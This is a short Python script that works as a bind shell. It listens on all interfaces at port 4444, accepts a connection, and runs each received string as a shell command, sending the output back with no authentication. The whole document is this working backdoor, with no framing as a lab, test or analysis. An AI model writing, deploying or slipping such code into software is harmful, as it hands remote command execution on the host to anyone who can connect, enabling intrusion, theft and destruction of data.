import socket
import subprocess

HOST = "0.0.0.0"
PORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)

print(f"[+] Listening on port {PORT}")

connection, addr = sock.accept()
print(f"[+] Connection from {addr}")

while True:
    cmd = connection.recv(1024).decode()
    if not cmd:
        break

    if cmd.lower() == "exit":
        break

    output = subprocess.getoutput(cmd)
    connection.send((output + "\n").encode())

connection.close()
sock.close()